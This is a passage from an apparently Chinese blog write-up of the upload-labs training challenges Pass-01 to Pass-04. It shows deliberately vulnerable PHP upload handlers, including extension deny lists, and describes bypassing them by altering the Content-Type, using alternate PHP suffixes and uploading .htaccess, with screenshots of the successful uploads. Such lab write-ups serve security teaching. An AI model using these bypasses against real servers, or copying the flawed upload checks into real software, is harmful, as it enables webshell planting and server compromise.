&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;这个有点玄学,谷歌有时会不行,拿火狐就可以了&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306141425783.png&#34; alt=&#34;image-20210306141425783&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传 c.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306141515473.png&#34; alt=&#34;image-20210306141515473&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306141525686.png&#34; alt=&#34;image-20210306141525686&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-02jpg改包php上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-02jpg改包php上传&#34;&gt;#&lt;/a&gt; Pass-02 (jpg 改包 php 上传)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;) || (&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;) || (&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;image/gif&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件类型不正确，请重新上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;jpg 改包为 php，成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306142420671.png&#34; alt=&#34;image-20210306142420671&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306142449990.png&#34; alt=&#34;image-20210306142449990&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-03php后缀上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-03php后缀上传&#34;&gt;#&lt;/a&gt; Pass-03 (php 后缀上传)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.asp&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.aspx&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;.jsp&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//收尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306142652858.png&#34; alt=&#34;image-20210306142652858&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306142712846.png&#34; alt=&#34;image-20210306142712846&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-04htaccess上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-04htaccess上传&#34;&gt;#&lt;/a&gt; Pass-04 (.htaccess 上传)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;php1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;pHp1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; 